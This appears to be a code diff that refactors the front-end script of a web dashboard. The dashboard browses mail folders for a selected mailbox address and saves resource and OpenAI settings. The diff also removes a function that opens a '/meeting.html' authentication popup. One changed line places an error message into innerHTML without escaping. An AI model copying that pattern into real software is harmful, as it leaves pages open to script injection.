+            } catch (err) { modal.innerHTML = `<div style="background:#111827; border-radius:16px; padding:20px;"><p>❌ ${err.message}</p><button class="btn btn-primary" onclick="this.closest('div').parentElement.remove()">Close</button></div>`; }
         }
         
         async function markAsRead(messageId) {
-            await apiCall(`/api/mail/message/${encodeURIComponent(currentMailboxEmail)}/${messageId}`, {
-                method: 'PATCH',
-                body: JSON.stringify({ isRead: true })
-            });
+            await apiCall(`/api/mail/message/${encodeURIComponent(currentMailboxEmail)}/${messageId}`, { method: 'PATCH', body: JSON.stringify({ isRead: true }) });
             loadFolderEmails(currentMailboxEmail, currentFolderId);
         }
         
@@ -769,17 +499,9 @@
             loadFolderEmails(currentMailboxEmail, currentFolderId);
         }
         
-        async function generateAIEmailSummary(emails) {
-            alert('AI summarizer would analyze these emails and provide a summary.');
-        }
+        function closeMailboxModal() { document.getElementById('mailboxModal').classList.remove('open'); }
         
-        function closeMailboxModal() {
-            document.getElementById('mailboxModal').classList.remove('open');
-        }
-        
-        // ============================================
         // Settings
-        // ============================================
         async function loadSettings() {
             const settings = await apiCall('/api/settings');
             if (settings) {
@@ -795,38 +517,17 @@
         }
         
         async function saveResourceSettings() {
-            const settings = {
-                active_resource: document.getElementById('activeResource').value,
-                api_version: document.getElementById('apiVersion').value
-            };
-            await apiCall('/api/resource/settings', { method: 'POST', body: JSON.stringify(settings) });
-            alert('Resource settings saved!');
+            await apiCall('/api/resource/settings', { method: 'POST', body: JSON.stringify({ active_resource: document.getElementById('activeResource').value, api_version: document.getElementById('apiVersion').value }) });
+            alert('Settings saved!');
         }
         
         async function saveOpenAISettings() {
-            const settings = {
-                enabled: document.getElementById('openaiEnabled').value === 'true',
-                api_key: document.getElementById('openaiApiKey').value,
-                model: document.getElementById('openaiModel').value,
-                max_tokens: parseInt(document.getElementById('openaiMaxTokens').value),
-                temperature: parseFloat(document.getElementById('openaiTemperature').value)
-            };
-            await apiCall('/api/openai/settings', { method: 'POST', body: JSON.stringify(settings) });
+            await apiCall('/api/openai/settings', { method: 'POST', body: JSON.stringify({ enabled: document.getElementById('openaiEnabled').value === 'true', api_key: document.getElementById('openaiApiKey').value, model: document.getElementById('openaiModel').value, max_tokens: parseInt(document.getElementById('openaiMaxTokens').value), temperature: parseFloat(document.getElementById('openaiTemperature').value) }) });
             alert('OpenAI settings saved!');
         }
         
-        document.getElementById('openaiTemperature').addEventListener('input', function() {
-            document.getElementById('tempValue').innerHTML = this.value;
-        });
+        document.getElementById('openaiTemperature').addEventListener('input', function() { document.getElementById('tempValue').innerHTML = this.value; });
         
-        // ============================================
-        // Auth Page URL
-        // ============================================
-        window.openAuthPage = function() {
-            window.open('/meeting.html', '_blank', 'width=600,height=700');
-        };
-        
-        // Initial load
         loadDashboard();
     </script>
 </body>
